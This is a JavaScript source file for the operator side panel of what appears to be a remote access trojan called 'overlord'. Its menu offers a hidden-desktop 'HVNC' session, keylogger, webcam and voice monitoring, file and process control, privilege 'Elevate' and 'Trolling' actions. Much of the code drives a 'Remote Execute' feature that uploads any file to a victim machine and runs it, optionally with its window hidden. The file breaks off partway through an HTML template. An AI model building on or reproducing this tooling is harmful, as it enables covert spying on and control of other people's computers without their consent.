/**
 * side-panel.js â€” Shared side action panel for desktop viewer & remote desktop pages.
 * Version: 1.3.0
 *
 * Usage:
 *   import { initSidePanel } from "./side-panel.js";
 *   initSidePanel(clientId, document.getElementById("sidePanel"));
 */

import { playClickSound, playErrorSound, playSuccessSound } from "./sounds.js";

const SIDE_PANEL_JS_VERSION = "1.10.0";

/* â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
/*  Menu definition                                            */
/* â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */

const PANEL_GROUPS = [
  {
    id: "remote-access",
    label: "Remote Access",
    icon: "fa-solid fa-plug",
    color: "#818cf8",
    items: [
      { label: "Console",          icon: "fa-solid fa-terminal",   color: "#34d399", open: "console" },
      { label: "Backstage (HVNC)", icon: "fa-solid fa-ghost",      color: "#a78bfa", open: "Backstage" },
    ],
  },
  {
    id: "monitoring",
    label: "Monitoring",
    icon: "fa-solid fa-eye",
    color: "#22d3ee",
    items: [
      { label: "Webcam",           icon: "fa-solid fa-video",      color: "#34d399", open: "webcam" },
      { label: "Keylogger",        icon: "fa-solid fa-keyboard",   color: "#facc15", open: "keylogger" },
      { label: "Process Manager",  icon: "fa-solid fa-list-check", color: "#fb923c", open: "processes" },
      { label: "Voice",            icon: "fa-solid fa-headset",    color: "#2dd4bf", open: "voice" },
    ],
  },
  {
    id: "system",
    label: "System",
    icon: "fa-solid fa-server",
    color: "#60a5fa",
    items: [
      { label: "File Browser", icon: "fa-solid fa-folder-tree", color: "#60a5fa", open: "files" },
      { label: "Classic Explorer", icon: "fa-solid fa-folder-open", color: "#fbbf24", open: "files-classic" },
    ],
  },
  {
    id: "trolling",
    label: "Trolling",
    emoji: "\u{1F921}",
    color: "#f472b6",
    items: [
      { label: "Change Wallpaper", icon: "fa-solid fa-image", color: "#c084fc", action: "wallpaper" },
      { label: "Remote Execute", icon: "fa-solid fa-bolt", color: "#f97316", action: "remote-execute" },
      { label: "Open URL", icon: "fa-solid fa-link", color: "#22d3ee", action: "open-url" },
      { label: "Message Box", icon: "fa-solid fa-comment-dots", color: "#fbbf24", action: "message-box" },
      { label: "Big Mouse", icon: "fa-solid fa-arrow-pointer", color: "#4ade80", action: "big-mouse" },
      { label: "Sound Board", icon: "fa-solid fa-music", color: "#f472b6", open: "soundboard-remote" },
    ],
  },
  {
    id: "agent",
    label: "Agent",
    icon: "fa-solid fa-robot",
    color: "#94a3b8",
    items: [
      { label: "Ping",           icon: "fa-solid fa-satellite-dish", color: "#94a3b8", action: "ping" },
      { label: "Reconnect",      icon: "fa-solid fa-rotate",        color: "#94a3b8", action: "reconnect" },
      { label: "Set Nickname",   icon: "fa-solid fa-signature",     color: "#94a3b8", action: "set-nickname" },
      { label: "Elevate",        icon: "fa-solid fa-arrow-up-right-dots", color: "#22c55e", action: "elevate" },
      { divider: true },
      { label: "Disconnect",     icon: "fa-solid fa-plug-circle-xmark", color: "#ef4444", action: "disconnect" },
      { label: "Uninstall",      icon: "fa-solid fa-trash",         color: "#ef4444", action: "uninstall" },
    ],
  },
];

/* â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
/*  Open-target â†’ URL mapping                                  */
/* â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */

function resolveOpenUrl(clientId, target) {
  switch (target) {
    case "console":     return `/${clientId}/console`;
    case "remotedesktop": return `/viewer?clientId=${clientId}&mode=dashboard2`;
    case "webcam":      return `/viewer?clientId=${clientId}&mode=webcam`;
    case "Backstage":   return `/backstage?clientId=${clientId}`;
    case "files":       return `/${clientId}/files`;
    case "files-classic": return `/${clientId}/files/classic`;
    case "processes":   return `/${clientId}/processes`;
    case "keylogger":   return `/${clientId}/keylogger`;
    case "voice":       return `/voice?clientId=${clientId}`;
    case "soundboard-remote": return `/soundboard-remote?clientId=${clientId}`;
    default:            return null;
  }
}

function openFileBrowserWindow(clientId, forceSkin) {
  // Explicit menu targets always open their own UI (never remap via last-used skin).
  const skin = forceSkin === "classic" ? "classic" : "modern";
  if (skin === "classic") {
    try {
      localStorage.setItem("overlord.filebrowser.skin", "classic");
    } catch {}
    window.open(
      `/${clientId}/files/classic`,
      `overlord-fb-classic-${clientId}`,
      "width=780,height=520,menubar=no,toolbar=no,location=no,status=no,resizable=yes,scrollbars=yes",
    );
    return;
  }
  try {
    localStorage.setItem("overlord.filebrowser.skin", "modern");
  } catch {}
  window.open(`/${clientId}/files`, "_blank", "noopener");
}

/* â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
/*  Toast notifications                                        */
/* â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */

let toastContainer = null;

function ensureToastContainer() {
  if (toastContainer) return;
  toastContainer = document.createElement("div");
  toastContainer.className = "sp-toast-container";
  document.body.appendChild(toastContainer);
}

function showToast(message, type = "info", durationMs = 4000) {
  if (type === "success") playSuccessSound();
  else if (type === "error") playErrorSound();

  ensureToastContainer();
  const toast = document.createElement("div");
  toast.className = `sp-toast sp-toast-${type}`;
  const iconMap = { success: "fa-circle-check", error: "fa-circle-xmark", info: "fa-circle-info" };
  toast.innerHTML = `<i class="fa-solid ${iconMap[type] || iconMap.info}"></i><span></span>`;
  const text = toast.querySelector("span");
  if (text) {
    text.textContent = message;
    if (String(message).includes("\n")) text.style.whiteSpace = "pre-line";
  }
  toastContainer.appendChild(toast);
  requestAnimationFrame(() => toast.classList.add("sp-toast-visible"));
  setTimeout(() => {
    toast.classList.remove("sp-toast-visible");
    toast.addEventListener("transitionend", () => toast.remove(), { once: true });
    setTimeout(() => toast.remove(), 500);
  }, durationMs);
}

/* â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
/*  REST helpers                                               */
/* â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */

async function sendCommand(clientId, action, payload) {
  const body = payload ? { action, ...payload } : { action };
  const res = await fetch(`/api/clients/${clientId}/command`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    credentials: "include",
    body: JSON.stringify(body),
  });
  const data = await res.json().catch(() => ({}));
  if (!res.ok) {
    throw new Error(data.error || data.message || `Command failed: ${res.status}`);
  }
  return data;
}

async function patchClient(clientId, field, value) {
  const res = await fetch(`/api/clients/${clientId}/${field}`, {
    method: "PATCH",
    headers: { "Content-Type": "application/json" },
    credentials: "include",
    body: JSON.stringify({ value }),
  });
  if (!res.ok) throw new Error(`Patch failed: ${res.status}`);
  return res.json().catch(() => ({}));
}

/* â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
/*  Wallpaper upload                                           */
/* â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */

const ALLOWED_EXTENSIONS = new Set(["jpg", "jpeg", "png", "bmp"]);
const MAX_FILE_SIZE = 10 * 1024 * 1024; // 10 MB
const WALLPAPER_POLL_MS = 500;
const REMOTE_EXECUTE_MAX_SIZE = 200 * 1024 * 1024; // 200 MB
const REMOTE_EXECUTE_POLL_MS = 500;
const REMOTE_EXECUTE_TRANSFER_POLL_MS = 200;
const REX_POS_STORAGE_PREFIX = "rex:pos:";
const REX_READY_STORAGE_PREFIX = "rex:ready:"; // legacy cleanup
const REX_SESSION_STORAGE_PREFIX = "rex:session:"; // legacy cleanup

function clearRexLegacyStorage(clientId) {
  try {
    localStorage.removeItem(`${REX_SESSION_STORAGE_PREFIX}${clientId}`);
    localStorage.removeItem(`${REX_READY_STORAGE_PREFIX}${clientId}`);
  } catch {
    /* ignore */
  }
}

function loadRexPanelPos(clientId) {
  try {
    const raw = localStorage.getItem(`${REX_POS_STORAGE_PREFIX}${clientId}`);
    if (!raw) return null;
    const parsed = JSON.parse(raw);
    const left = Number(parsed?.left);
    const top = Number(parsed?.top);
    if (!Number.isFinite(left) || !Number.isFinite(top)) return null;
    return { left, top };
  } catch {
    return null;
  }
}

function saveRexPanelPos(clientId, pos) {
  try {
    localStorage.setItem(
      `${REX_POS_STORAGE_PREFIX}${clientId}`,
      JSON.stringify({ left: Math.round(pos.left), top: Math.round(pos.top) }),
    );
  } catch {
    /* ignore */
  }
}

function formatBytes(bytes) {
  const value = Number(bytes) || 0;
  if (value <= 0) return "0 B";
  const units = ["B", "KB", "MB", "GB"];
  let size = value;
  let unit = 0;
  while (size >= 1024 && unit < units.length - 1) {
    size /= 1024;
    unit += 1;
  }
  return `${size >= 10 || unit === 0 ? Math.round(size) : size.toFixed(1)} ${units[unit]}`;
}

function formatSpeed(bytesPerSecond) {
  const value = Number(bytesPerSecond) || 0;
  if (value <= 0) return "0 B/s";
  return `${formatBytes(value)}/s`;
}

function wallpaperPhaseLabel(phase) {
  switch (phase) {
    case "queued": return "Queued";
    case "client_transfer": return "Client transfer";
    case "verify_remote_file": return "Verifying file on client";
    case "apply_wallpaper": return "Applying wallpaper";
    case "succeeded": return "Wallpaper applied";
    case "failed": return "Wallpaper failed";
    default: return "Wallpaper";
  }
}

function wallpaperTransferStateLabel(state) {
  switch (state) {
    case "command_not_sent": return "Command was not sent";
    case "command_sent_no_client_progress": return "Command sent; client did not acknowledge the transfer";
    case "client_transfer_active": return "Client acknowledged the transfer";
    case "client_transfer_complete": return "Client transfer completed";
    default: return "Waiting for client acknowledgement";
  }
}

function wallpaperEndpointSourceLabel(source) {
  switch (source) {
    case "external_config": return "Configured public endpoint";
    case "forwarded_host": return "Reverse-proxy forwarded host";
    case "request_host": return "Request host fallback";
    default: return "Unknown endpoint source";
  }
}

function renderWallpaperDetails(status, file) {
  const transferred = formatBytes(status.bytesTransferred || 0);
  const total = formatBytes(status.totalBytes || file.size || 0);
  const speed = formatSpeed(status.speedBytesPerSecond || 0);
  const destination = status.destinationPath || "unknown destination";
  const endpoint = status.resolvedUrl || status.pullOrigin || "waiting for transfer endpoint";
  const client = String(status.clientId || "unknown").slice(0, 12);
  const version = status.clientVersion ? ` Â· v${status.clientVersion}` : "";
  return `
    <div class="sp-progress-detail">${escapeHtml(file.name)} Â· ${transferred} / ${total} Â· ${speed}</div>
    <div class="sp-progress-detail">Client: ${escapeHtml(client)}${escapeHtml(version)} Â· ${escapeHtml(wallpaperTransferStateLabel(status.transferState))}</div>
    <div class="sp-progress-detail">Destination: ${escapeHtml(destination)}</div>
    <div class="sp-progress-detail">Endpoint: ${escapeHtml(endpoint)}</div>
  `;
}

function wallpaperErrorText(status) {
  const err = status?.error || {};
  const parts = [
    err.message || status?.message || "Wallpaper change failed",
    err.phase ? `Step: ${wallpaperPhaseLabel(err.phase)}` : "",
    err.transferState || status?.transferState ? `Transfer state: ${wallpaperTransferStateLabel(err.transferState || status.transferState)}` : "",
    err.clientVersion || status?.clientVersion ? `Client version: ${err.clientVersion || status.clientVersion}` : "",
    err.endpointSource || status?.endpointSource ? `Endpoint source: ${wallpaperEndpointSourceLabel(err.endpointSource || status.endpointSource)}` : "",
    `Transferred: ${formatBytes(err.bytesTransferred ?? status?.bytesTransferred ?? 0)} / ${formatBytes(err.totalBytes ?? status?.totalBytes ?? 0)}`,
    err.destinationPath ? `Destination: ${err.destinationPath}` : "",
    err.resolvedUrl || err.pullOrigin ? `Endpoint: ${err.resolvedUrl || err.pullOrigin}` : "",
    err.clientMessage ? `Client: ${err.clientMessage}` : "",
    err.serverMessage ? `Server: ${err.serverMessage}` : "",
  ].filter(Boolean);
  return parts.join("\n");
}

function triggerWallpaperUpload(clientId) {
  const input = document.createElement("input");
  input.type = "file";
  input.accept = ".jpg,.jpeg,.png,.bmp";
  input.style.display = "none";
  document.body.appendChild(input);

  input.addEventListener("change", () => {
    const file = input.files?.[0];
    input.remove();
    if (!file) return;

    const ext = (file.name.split(".").pop() || "").toLowerCase();
    if (!ALLOWED_EXTENSIONS.has(ext)) {
      showToast(`Unsupported format: .${ext} â€” use JPG, PNG, or BMP`, "error");
      return;
    }
    if (file.size > MAX_FILE_SIZE) {
      showToast(`File too large (${(file.size / 1024 / 1024).toFixed(1)} MB). Max is 10 MB.`, "error");
      return;
    }

    uploadWallpaper(clientId, file);
  });

  input.click();
}

function uploadWallpaper(clientId, file) {
  const formData = new FormData();
  formData.append("file", file);

  const xhr = new XMLHttpRequest();

  /* -- progress toast -- */
  ensureToastContainer();
  const progressToast = document.createElement("div");
  progressToast.className = "sp-toast sp-toast-info sp-toast-visible sp-toast-progress";
  progressToast.innerHTML = `
    <i class="fa-solid fa-cloud-arrow-up"></i>
    <span class="sp-progress-label">Preparing wallpaper upload\u2026</span>
    <div class="sp-progress-meta"></div>
    <div class="sp-progress-track"><div class="sp-progress-bar"></div></div>
  `;
  toastContainer.appendChild(progressToast);
  const bar = progressToast.querySelector(".sp-progress-bar");
  const label = progressToast.querySelector(".sp-progress-label");
  const meta = progressToast.querySelector(".sp-progress-meta");

  let pollTimer = null;
  let completed = false;

  const cleanup = () => {
    if (pollTimer) {
      clearTimeout(pollTimer);
      pollTimer = null;
    }
    progressToast.remove();
  };

  xhr.upload.addEventListener("progress", (e) => {
    if (!e.lengthComputable) return;
    const pct = Math.min(99, Math.floor((e.loaded / e.total) * 100));
    bar.style.width = `${Math.min(45, pct)}%`;
    label.textContent = `Host to server\u2026 ${pct}%`;
    meta.innerHTML = `
      <div class="sp-progress-detail">${escapeHtml(file.name)} Â· ${formatBytes(e.loaded)} / ${formatBytes(e.total)}</div>
      <div class="sp-progress-detail">Preparing client transfer after staging completes</div>
    `;
  });

  async function pollWallpaperJob(jobId) {
    try {
      const res = await fetch(`/api/clients/${clientId}/wallpaper/${encodeURIComponent(jobId)}`, { credentials: "include" });
      const status = await res.json().catch(() => ({}));
      if (!res.ok) {
        throw new Error(status.message || `Wallpaper status failed: ${res.status}`);
      }

      const pct = status.status === "succeeded" ? 100 : Math.min(99, Math.max(0, Number(status.percent) || 0));
      bar.style.width = `${pct}%`;
      label.textContent = `${wallpaperPhaseLabel(status.phase)}\u2026 ${pct}%`;
      meta.innerHTML = renderWallpaperDetails(status, file);

      if (status.status === "succeeded") {
        completed = true;
        label.textContent = "Wallpaper applied successfully 100%";
        bar.style.width = "100%";
        setTimeout(() => {
          cleanup();
          showToast("Wallpaper changed successfully!", "success");
        }, 600);
        return;
      }

      if (status.status === "failed") {
        completed = true;
        cleanup();
        showToast(wallpaperErrorText(status), "error", 10000);
        return;
      }

      pollTimer = setTimeout(() => pollWallpaperJob(jobId), WALLPAPER_POLL_MS);
    } catch (err) {
      completed = true;
      cleanup();
      showToast(err.message || "Wallpaper status polling failed", "error", 8000);
    }
  }

  xhr.addEventListener("load", () => {
    if (xhr.status >= 200 && xhr.status < 300) {
      try {
        const res = JSON.parse(xhr.responseText);
        if (res.ok && res.jobId) {
          bar.style.width = "0%";
          label.textContent = "Waiting for client transfer\u2026 0%";
          meta.innerHTML = `
            <div class="sp-progress-detail">${escapeHtml(file.name)} Â· ${formatBytes(0)} / ${formatBytes(res.totalBytes || file.size)}</div>
            <div class="sp-progress-detail">To: ${escapeHtml(res.destinationPath || "unknown destination")}</div>
            <div class="sp-progress-detail">Endpoint: ${escapeHtml(res.pullOrigin || "waiting for transfer endpoint")}</div>
          `;
          pollWallpaperJob(res.jobId);
        } else if (res.ok) {
          completed = true;
          cleanup();
          showToast("Wallpaper changed successfully!", "success");
        } else {
          completed = true;
          cleanup();
          showToast(res.message || "Wallpaper change failed", "error", 6000);
        }
      } catch {
        completed = true;
        cleanup();
        showToast("Wallpaper response was not valid JSON", "error", 6000);
      }
    } else {
      let msg = "Upload failed";
      try { msg = JSON.parse(xhr.responseText).message || msg; } catch {}
      completed = true;
      cleanup();
      showToast(msg, "error", 6000);
    }
  });

  xhr.addEventListener("error", () => {
    completed = true;
    cleanup();
    showToast("Network error during upload", "error");
  });

  xhr.addEventListener("abort", () => {
    cleanup();
    if (!completed) showToast("Upload cancelled", "info");
  });

  xhr.open("POST", `/api/clients/${clientId}/wallpaper`);
  xhr.withCredentials = true;
  xhr.send(formData);
}

/* â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
/*  Remote Execute                                             */
/* â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */

/* ── Remote Execute ─────────────────────────────────────────── */

function remoteExecutePhaseLabel(phase, status) {
  if (phase === "client_transfer") {
    const state = status?.transferState;
    const clientStatus = status?.lastClientStatus;
    if (clientStatus === "ws_fallback" || status?.transferMethod === "ws_chunks" || status?.usedTransferFallback) {
      return "WebSocket upload fallback";
    }
    if (clientStatus === "retrying") return "Retrying client upload";
    if (clientStatus === "requesting") return "Client requesting file";
    if (clientStatus === "accepted" || clientStatus === "starting") return "Client accepted transfer";
    if (state === "command_sent_no_client_progress" || !status?.clientAcknowledged) {
      return "Waiting for client";
    }
    if ((Number(status?.bytesTransferred) || 0) <= 0) return "Connecting to client";
    return "Uploading to client";
  }
  switch (phase) {
    case "queued": return "Queued";
    case "staging": return "Staging on server";
    case "chmod": return "Setting permissions";
    case "ready":
      return status?.lastError ? "Ready (last launch failed)" : "Ready";
    case "execute":
      return status?.usedExecFallback || status?.lastClientStatus === "script_fallback"
        ? "Launching via fallback"
        : "Starting process";
    case "succeeded": return "Done";
    case "failed": return "Failed";
    default: return "Remote execute";
  }
}

function remoteExecuteTone(status, explicit) {
  if (explicit) return explicit;
  if (!status) return "idle";
  if (status.status === "failed" || status.phase === "failed") return "err";
  if (status.status === "succeeded" || status.phase === "succeeded") return "ok";
  if (status.status === "ready" || status.phase === "ready") {
    return status.lastError ? "warn" : "ok";
  }
  if (
    status.lastClientStatus === "retrying" ||
    status.usedTransferFallback ||
    status.usedExecFallback ||
    status.lastClientStatus === "script_fallback" ||
    status.lastClientStatus === "ws_fallback"
  ) {
    return "warn";
  }
  if (
    status.status === "running" ||
    status.phase === "client_transfer" ||
    status.phase === "staging" ||
    status.phase === "execute" ||
    status.phase === "chmod"
  ) {
    return "run";
  }
  return "idle";
}

function formatRexExpiry(expiresAt) {
  const ms = Number(expiresAt) - Date.now();
  if (!Number.isFinite(ms) || ms <= 0) return "expiring";
  const mins = Math.max(1, Math.round(ms / 60_000));
  if (mins >= 60) return `${Math.floor(mins / 60)}h ${mins % 60}m left`;
  return `${mins}m left`;
}

function shortRexJobId(jobId) {
  const id = String(jobId || "");
  return id.length > 8 ? id.slice(0, 8) : id;
}

function mountRexPanelHost() {
  const main = document.querySelector(".viewer-main") || document.body;
  let host = main.querySelector(".sp-rex-host");
  if (!host) {
    host = document.createElement("div");
    host.className = "sp-rex-host";
    main.appendChild(host);
  }
  return host;
}

async function fetchRexJobs(clientId) {
  const res = await fetch(`/api/clients/${encodeURIComponent(clientId)}/remote-execute`, {
    credentials: "include",
  });
  if (!res.ok) {
    if (res.status === 404) return [];
    const body = await res.json().catch(() => ({}));
    throw new Error(body.message || `Failed to list remote execute jobs (${res.status})`);
  }
  const body = await res.json().catch(() => ({}));
  return Array.isArray(body.jobs) ? body.jobs : [];
}

async function fetchRexJob(clientId, jobId) {
  const res = await fetch(
    `/api/clients/${encodeURIComponent(clientId)}/remote-execute/${encodeURIComponent(jobId)}`,
    { credentials: "include" },
  );
  const body = await res.json().catch(() => ({}));
  if (!res.ok) {
    const err = new Error(body.message || `Job not found (${res.status})`);
    err.status = res.status;
    err.body = body;
    throw err;
  }
  return body;
}

function sortRexJobs(jobs) {
  const rank = (job) => {
    if (job.status === "running" || job.status === "queued") return 0;
    if (job.status === "ready") return 1;
    return 2;
  };
  return [...jobs].sort((a, b) => {
    const byRank = rank(a) - rank(b);
    if (byRank !== 0) return byRank;
    return (b.updatedAt || 0) - (a.updatedAt || 0);
  });
}

function clampRexPanelPosition(panel, host, left, top) {
  const hostRect = host.getBoundingClientRect();
  const width = panel.offsetWidth || 320;
  const height = panel.offsetHeight || 200;
  const maxLeft = Math.max(0, hostRect.width - width);
  const maxTop = Math.max(0, hostRect.height - height);
  return {
    left: Math.min(maxLeft, Math.max(0, left)),
    top: Math.min(maxTop, Math.max(0, top)),
  };
}

function applyRexPanelPosition(panel, host, clientId, preferred) {
  const hostRect = host.getBoundingClientRect();
  const width = panel.offsetWidth || 320;
  const height = panel.offsetHeight || 200;
  let left;
  let top;
  if (preferred && Number.isFinite(preferred.left) && Number.isFinite(preferred.top)) {
    left = preferred.left;
    top = preferred.top;
  } else {
    left = 12;
    top = Math.max(12, hostRect.height - height - 12);
  }
  const clamped = clampRexPanelPosition(panel, host, left, top);
  panel.style.left = `${clamped.left}px`;
  panel.style.top = `${clamped.top}px`;
  panel.style.right = "auto";
  panel.style.bottom = "auto";
  saveRexPanelPos(clientId, clamped);
}

function enableRexPanelDrag(panel, host, clientId) {
  const bar = panel.querySelector("[data-rex-drag]");
  if (!bar) return;
  let dragging = false;
  let startX = 0;
  let startY = 0;
  let origLeft = 0;
  let origTop = 0;

  bar.addEventListener("pointerdown", (e) => {
    if (e.button !== 0) return;
    if (e.target.closest("[data-rex-close]")) return;
    dragging = true;
    startX = e.clientX;
    startY = e.clientY;
    origLeft = panel.offsetLeft;
    origTop = panel.offsetTop;
    bar.setPointerCapture?.(e.pointerId);
    panel.classList.add("is-dragging");
    e.preventDefault();
  });

  bar.addEventListener("pointermove", (e) => {
    if (!dragging) return;
    const next = clampRexPanelPosition(
      panel,
      host,
      origLeft + (e.clientX - startX),
      origTop + (e.clientY - startY),
    );
    panel.style.left = `${next.left}px`;
    panel.style.top = `${next.top}px`;
  });

  const endDrag = (e) => {
    if (!dragging) return;
    dragging = false;
    panel.classList.remove("is-dragging");
    try {
      bar.releasePointerCapture?.(e.pointerId);
    } catch {
      /* ignore */
    }
    saveRexPanelPos(clientId, { left: panel.offsetLeft, top: panel.offsetTop });
  };
  bar.addEventListener("pointerup", endDrag);
  bar.addEventListener("pointercancel", endDrag);

  const onResize = () => {
    applyRexPanelPosition(panel, host, clientId, {
      left: panel.offsetLeft,
      top: panel.offsetTop,
    });
  };
  window.addEventListener("resize", onResize);
  panel._rexOnResize = onResize;
}

function renderRexJobRow(job, opts = {}) {
  const tone = remoteExecuteTone(job);
  const name = job.originalName || "file";
  const shortId = shortRexJobId(job.jobId);
  const size = formatBytes(job.totalBytes || 0);
  const expiry = job.expiresAt && (job.status === "ready" || job.status === "running")
    ? formatRexExpiry(job.expiresAt)
    : "";
  const path = job.destinationPath || "";
  const pct =
    job.status === "ready" || job.status === "succeeded"
      ? 100
      : Math.max(0, Math.min(99, Number(job.percent) || 0));
  const phase = remoteExecutePhaseLabel(job.phase || job.status, job);
  let badge = String(job.status || "job");
  if (job.status === "ready") badge = job.lastError ? "Ready*" : "Ready";
  else if (job.status === "running" || job.status === "queued") badge = "Active";
  else if (job.status === "succeeded") badge = "Done";
  else if (job.status === "failed") badge = "Failed";

  const err = job.lastError?.message || job.error?.message || "";
  const busy = !!opts.controllers?.has?.(job.jobId);
  const canExec = job.status === "ready" || job.canExecute;
  const isActive = job.status === "running" || job.status === "queued";
  const isTerminal = job.status === "succeeded" || job.status === "failed";

  let actions = "";
  if (isActive || busy) {
    actions = `<button type="button" class="sp-progress-action sp-progress-action-muted" data-rex-row-cancel="${escapeHtml(job.jobId)}">Cancel</button>`;
  } else if (canExec) {
    actions = `
      <button type="button" class="sp-progress-action" data-rex-row-exec="${escapeHtml(job.jobId)}">Execute</button>
      <button type="button" class="sp-progress-action sp-progress-action-muted" data-rex-row-discard="${escapeHtml(job.jobId)}">Discard</button>`;
  } else if (isTerminal) {
    actions = `<button type="button" class="sp-progress-action sp-progress-action-muted" data-rex-row-dismiss="${escapeHtml(job.jobId)}">Dismiss</button>`;
  }

  const progressLine = isActive
    ? `<div class="sp-rex-row-progress rex-tone-${tone}">${escapeHtml(phase)} · ${pct}%</div>`
    : "";

  return `
    <div class="sp-rex-session rex-tone-${tone}" data-rex-row data-job-id="${escapeHtml(job.jobId)}">
      <div class="sp-rex-session-top">
        <span class="sp-rex-badge rex-tone-${tone}">${escapeHtml(badge)}</span>
        <span class="sp-rex-session-name" title="${escapeHtml(name)}">${escapeHtml(name)}</span>
        <span class="sp-rex-session-meta">${escapeHtml(shortId)} · ${escapeHtml(size)}${expiry ? ` · ${escapeHtml(expiry)}` : ""}</span>
      </div>
      ${path ? `<div class="sp-rex-session-path" title="${escapeHtml(path)}">${escapeHtml(path)}</div>` : ""}
      ${progressLine}
      ${err ? `<div class="sp-rex-session-err">${escapeHtml(err)}</div>` : ""}
      <div class="sp-rex-session-actions">${actions}</div>
    </div>
  `;
}

function createRemoteExecutePanel(clientId) {
  const host = mountRexPanelHost();
  const existing = [...host.querySelectorAll(".sp-rex-panel")].find((el) => el.dataset.clientId === clientId);
  if (existing) {
    existing.classList.add("is-focus");
    existing.scrollIntoView?.({ block: "nearest" });
    return existing;
  }

  clearRexLegacyStorage(clientId);

  const panel = document.createElement("div");
  panel.className = "sp-rex-panel";
  panel.dataset.clientId = clientId;
  panel.setAttribute("role", "dialog");
  panel.setAttribute("aria-modal", "false");
  panel.innerHTML = `
    <div class="sp-rex-chrome">
      <div class="sp-rex-titlebar" data-rex-drag>
        <span class="sp-rex-title">Remote Execute</span>
        <button type="button" class="sp-rex-close" data-rex-close aria-label="Close">&times;</button>
      </div>
      <div class="sp-rex-body sp-rex-files" data-rex-files>
        <div class="sp-rex-section-label">Staged files <span class="sp-rex-section-hint">~30 min after upload</span></div>
        <div class="sp-rex-file-list" data-rex-file-list>
          <p class="sp-help sp-rex-empty-hint">No staged files for this client yet.</p>
        </div>
      </div>
      <div class="sp-rex-body" data-rex-upload>
        <label class="sp-field">
          <span>File (any type)</span>
          <div class="sp-rex-file-row">
            <label class="sp-rex-file-btn">
              Choose file
              <input type="file" data-rex-file class="sp-rex-file-input" />
            </label>
            <span class="sp-rex-file-name" data-rex-file-name>No file selected</span>
          </div>
        </label>
        <label class="sp-field">
          <span>Arguments (optional)</span>
          <input type="text" data-rex-args class="sp-input" placeholder='e.g. --silent "/path with spaces"' />
        </label>
        <label class="sp-field sp-field-check">
          <input type="checkbox" data-rex-hide />
          <span>Hide window (executables/scripts only)</span>
        </label>
        <p class="sp-help">Upload only stages. Upload &amp; Run launches after transfer. Max ${REMOTE_EXECUTE_MAX_SIZE / 1024 / 1024} MB. Close keeps jobs running.</p>
      </div>
      <div class="sp-rex-body sp-rex-activity" data-rex-activity hidden>
        <div class="sp-rex-progress-label rex-tone-run" data-rex-activity-label>Staging...</div>
